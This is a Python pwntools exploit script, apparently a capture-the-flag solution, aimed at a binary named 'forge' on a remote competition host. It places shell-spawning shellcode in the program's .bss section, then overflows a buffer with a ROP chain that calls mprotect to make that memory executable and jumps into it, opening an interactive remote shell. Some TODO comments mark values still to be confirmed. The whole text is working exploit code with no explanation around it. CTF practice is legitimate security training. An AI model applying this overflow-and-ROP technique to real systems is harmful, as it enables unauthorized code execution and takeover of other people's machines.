#!/usr/bin/env python3
from pwn import *

context.binary = elf = ELF('./forge', checksec=False)
context.arch = 'amd64'

OFFSET_TO_RIP = 72  # TODO: find with cyclic

shellcode = asm(shellcraft.sh())
shellcode_addr = elf.sym.shellcode
page = shellcode_addr & ~0xfff

#p = process(elf.path)
HOST,PORT="offsec.m0lecon.it", 13526
p=remote(HOST,PORT)

# Stage 1: send shellcode into .bss
p.recvuntil(b'Send shellcode:')
p.send(shellcode.ljust(0x400, b'\x90'))

# Stage 2: ROP chain
payload = flat(
    b'A' * OFFSET_TO_RIP,
    p64(elf.sym.ret_gadget),
    p64(elf.sym.pop_rdi_ret), p64(page),       # TODO: mprotect arg 1
    p64(elf.sym.pop_rsi_ret), p64(0x1000),       # TODO: mprotect arg 2
    p64(elf.sym.pop_rdx_ret), p64(7),       # TODO: mprotect arg 3
    p64(elf.plt.mprotect),
    p64(shellcode_addr),                                  # TODO: where to jump after mprotect?
)

p.recvuntil(b'Input:')
p.send(payload)
p.interactive()
